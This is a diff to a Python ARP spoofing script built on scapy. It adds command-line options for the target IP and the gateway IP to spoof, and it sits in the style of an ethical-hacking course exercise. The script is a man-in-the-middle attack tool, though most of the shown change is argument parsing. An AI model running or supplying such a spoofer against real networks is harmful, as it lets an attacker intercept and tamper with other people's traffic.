@@ -1,11 +1,26 @@
 import scapy.all as scapy
 import time
 import sys
+import optparse
 
 
 # pdst is the ip of destination
 # hwdst is the mac of destination
 # psrc is the current source ip where the packet is coming from 
+
+
+def get_arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-t", "--targetip", dest="targetip",
+                      help="IP address of the target to spoof")
+    parser.add_option("-g", "--gatewayip", dest="gatewayip", help="IP address of the gateway to spoof")
+    (options, arguments) = parser.parse_args()
+    if not options.targetip:
+        parser.error("Please specify a target_ip use --help for more info")
+    elif not options.gatewayip:
+        parser.error("Please specify a router_ip address use --help")
+
+    return options
 
 
 def get_mac(ip):
@@ -32,8 +47,9 @@ def restore(dest_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-target_ip = ""
-gateway_ip = ""
+options = get_arguments()
+target_ip = options.targetip
+gateway_ip = options.gatewayip
 try:
     send_packets_count = 0
     while True:
